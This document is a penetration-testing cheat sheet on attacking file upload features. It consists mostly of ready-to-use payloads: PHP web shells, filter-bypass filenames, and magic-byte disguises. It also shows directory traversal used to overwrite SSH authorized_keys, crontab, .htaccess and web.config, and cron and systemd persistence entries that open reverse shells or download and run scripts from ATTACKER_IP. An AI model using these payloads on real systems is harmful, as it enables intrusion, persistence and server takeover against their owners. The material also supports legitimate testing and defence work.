# File Upload Attacks

File upload vulnerabilities can be exploited for direct code execution via web shells or, when direct execution is not possible, combined with directory traversal to overwrite critical system files and achieve remote code execution.

---

## Upload Mechanism Discovery

### Common Upload Parameters

```
file=
upload=
attachment=
document=
image=
avatar=
profile_pic=
filename=
```

### Testing Upload Functionality

```bash
# Basic file upload test
curl -X POST -F "file=@test.txt" http://TARGET/upload.php

# Test different file extensions
curl -X POST -F "file=@test.jpg" http://TARGET/upload.php
curl -X POST -F "file=@test.pdf" http://TARGET/upload.php
```

---

## Web Shell Upload

### PHP Web Shells

```php
// Minimal PHP shell
<?php system($_GET['cmd']); ?>

// Obfuscated PHP shell
<?php $f='system'; $f($_GET[0]); ?>

// Advanced PHP shell
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

---

## Extension Filter Bypass

### Double Extensions

```
shell.php.jpg
backdoor.asp.png
shell.php5
shell.phtml
shell.phar
```

### Case Manipulation

```
SHELL.PHP
backdoor.ASP
shell.PhP
```

### Special Characters

```
shell.ph%00p
backdoor.as%20p
shell.php%00.jpg
```

---

## Content-Type Manipulation

```http
# Disguise as image
Content-Type: image/jpeg
Content-Type: image/png

# Disguise as document
Content-Type: application/pdf
Content-Type: text/plain
```

---

## Content Validation Bypass (Magic Bytes)

```bash
# Magic bytes for images
# JPEG: FF D8 FF
# PNG: 89 50 4E 47
# GIF: 47 49 46 38

# Prepend magic bytes to payload
echo -e '\xFF\xD8\xFF<?php system($_GET[0]); ?>' > shell.jpg.php

# GIF header trick
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

---

## Non-Executable File Upload (Directory Traversal)

When direct code execution is not possible, combine upload with directory traversal in the filename parameter to overwrite critical files.

### Directory Traversal in Filenames

#### Linux Targets

```bash
../../../../../../../root/.ssh/authorized_keys
../../../../../../../var/www/html/shell.php
../../../../../../../etc/crontab
../../../../../../../tmp/backdoor.sh
```

#### Windows Targets

```cmd
..\..\..\..\..\..\..\inetpub\wwwroot\shell.asp
..\..\..\..\..\..\..\users\administrator\.ssh\authorized_keys
..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
```

---

## SSH Key Injection Attack

### Generate SSH Key Pair

```bash
ssh-keygen -t rsa -b 2048 -f fileup -N ""
cat fileup.pub > authorized_keys
```

### Upload via Directory Traversal

```bash
# Target root user
filename="../../../../../../../root/.ssh/authorized_keys"

# Target specific user
filename="../../../../../../../home/www-data/.ssh/authorized_keys"
filename="../../../../../../../home/ubuntu/.ssh/authorized_keys"
```

### SSH Connection

```bash
ssh -i fileup -p 22 root@TARGET
ssh -o StrictHostKeyChecking=no -i fileup root@TARGET
```

---

## Cron Job Injection

### Create Malicious Cron Job

```bash
# Reverse shell cron job
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Download and execute
* * * * * wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
```

### Upload Cron File

```bash
filename="../../../../../../../etc/crontab"
filename="../../../../../../../var/spool/cron/crontabs/root"
filename="../../../../../../../etc/cron.d/backdoor"
```

---

## Configuration File Overwrite

### Apache .htaccess Injection

```apache
# Enable PHP execution in uploads directory
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# Directory listing
Options +Indexes
```

### IIS Web.config Manipulation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI" path="*.jpg" verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\php\php-cgi.exe"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

---

## Critical File Overwrite Targets

### Linux

```bash
# SSH
/root/.ssh/authorized_keys
/home/[user]/.ssh/authorized_keys

# Cron
/etc/crontab
/var/spool/cron/crontabs/root

# Web application
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.htaccess

# System
/etc/passwd
/etc/shadow
/etc/sudoers
```

### Windows

```cmd
# SSH
C:\users\administrator\.ssh\authorized_keys

# Web application
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\default.aspx
C:\xampp\htdocs\shell.php

# System
C:\windows\system32\drivers\etc\hosts
```

---

## Filename Obfuscation

```bash
# URL encoding
filename="..%2F..%2F..%2Froot%2F.ssh%2Fauthorized_keys"

# Double encoding
filename="..%252F..%252F..%252Froot%252F.ssh%252Fauthorized_keys"

# Mixed separators
filename="..\/..\/..\/root\/.ssh\/authorized_keys"

# Null byte injection
filename="../../../../../../../root/.ssh/authorized_keys%00.jpg"
```

---

## Service Configuration Overwrite

```ini
# Systemd service file for persistence
[Unit]
Description=System Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
```

Target paths:
```
/etc/systemd/system/backdoor.service
/etc/init.d/backdoor
/etc/rc.local
```

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite | Intercept and modify upload requests |
| curl | Test file upload endpoints |
| ssh-keygen | Generate SSH key pairs |
| Netcat | Reverse shell listeners |
| Python requests | Automated upload testing |
